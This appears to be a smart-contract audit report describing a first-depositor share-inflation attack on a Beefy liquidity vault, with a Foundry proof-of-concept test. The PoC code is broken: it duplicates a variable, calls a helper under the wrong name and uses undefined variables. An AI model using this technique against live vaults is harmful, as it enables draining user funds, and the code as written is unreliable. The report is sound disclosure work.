Jumpy White Canary

high

# The share allocation mechanism is vulnerable to front-running leading to an excessive share issuance for minimal initial contribution of 1wei

## Summary
The share allocation mechanism  is vulnerable to front-running.   An attacker(Alice)  can exploit this by providing minimal liquidity  `1 wei`  before other users deposit significant amounts. This initial minimal deposit leads to the attacker receiving an excessively large number of shares.


## Vulnerability Detail
The vulnerability lies in the initial liquidity provision and share calculation. The share allocation does not account for very small deposits, leading to an excessive share issuance for minimal initial contributions.



The steps are as follows:

1. An attacker(Alice) makes an initial deposit of `1 wei` of `token0` and `token1` to the vault.

2. Due to the way shares are calculated, the attacker(Alice)  receives a disproportionately large number of shares for this minimal deposit,

3. A legitimate user subsequently deposits a significant amount (e.g., 100 units of token0 and token1.

4. The attacker, holding a disproportionately large number of shares, withdraws from the vault.

5. The attacker receives a substantial portion of the vault's funds, far exceeding their initial minimal deposit.



In the test suite , add the following helper deposit function :
```solidity
   function _deposit_helper(address user1, string memory userName, uint amount) public {
   
    

    // Approve tokens
    IERC20(token0).approve(address(vault), amount);
    IERC20(token1).approve(address(vault), amount);

      
        // Preview deposit
        (uint _shares, uint256 _amount0, uint256 _amount1) = vault.previewDeposit(amount, amount);

    // Perform deposit
    try vault.deposit(_amount0, _amount1, _shares) {
        uint256 shares = vault.balanceOf(user1);
        console.log(string(abi.encodePacked("Shares for ", userName, ":")), shares);
    } catch (bytes memory reason) {
        console.log(string(abi.encodePacked("Deposit failed for ", userName, ":")), string(reason));
    }

   }




```

Now the poc 
```solidity
function test_poc() public {
  address Alice = vm.addr(0x123);
     deal(address(token0), Alice, 100);
     deal(address(token1), Alice, 100);
 
    vm.startPrank(Alice);
   uint x = 1;
    _deposit1(Alice, "Alice ", x);
      vm.stopPrank();
  
   skip(1 hours);



 address legit_user1= vm.addr(0x124);
          vm.startPrank( legit_user1);
    deal(address(token0), user, token0Size);
     deal(address(token1), user, token1Size);
   uint y = 100;
     _deposit1(user, "legit User1 ", y);
      vm.stopPrank();

skip(1 hours);
 address legit_user1= vm.addr(0x125);
    vm.startPrank( legit_user2);
    deal(address(token0), keeper, token0Size);
     deal(address(token1), keeper, token1Size);

   uint x2 = 200;
    _deposit1(keeper, " legit_user2", x2);
      vm.stopPrank();
 

            vm.startPrank(Alice);
                strategy.harvest(Alice);
uint256 _sharesBal = IERC20(address(vault)).balanceOf(Alice); 
  (uint256 _slip0, uint256 _slip1) = vault.previewWithdraw(_sharesBal);
    vault.withdrawAll(_slip0, _slip1);
    uint256 newBalance1 = IERC20(token0).balanceOf(Alice);
       uint256 newBalance2 = IERC20(token1).balanceOf(Alice);
   console.log("Alice New Balance: ", newBalance1);
    console.log("Alice New Balance: ", newBalance2);
      vm.stopPrank();







}

```
## Impact
This will result in loss of legimate users funds . Legitimate users wont be able to withdraw their funds . 

## Code Snippet
https://github.com/sherlock-audit/2024-05-beefy-cowcentrated-liquidity-manager/blob/main/cowcentrated-contracts/contracts/strategies/velodrome/StrategyPassiveManagerVelodrome.sol#L28

https://github.com/sherlock-audit/2024-05-beefy-cowcentrated-liquidity-manager/blob/main/cowcentrated-contracts/contracts/vault/BeefyVaultConcLiq.sol#L16

## Tool used

Manual Review

## Recommendation
1. introduce a minimum deposit threshold
2. Ensure the share allocation is proportional to the amount deposited and prevent excessive share issuance for minimal deposits
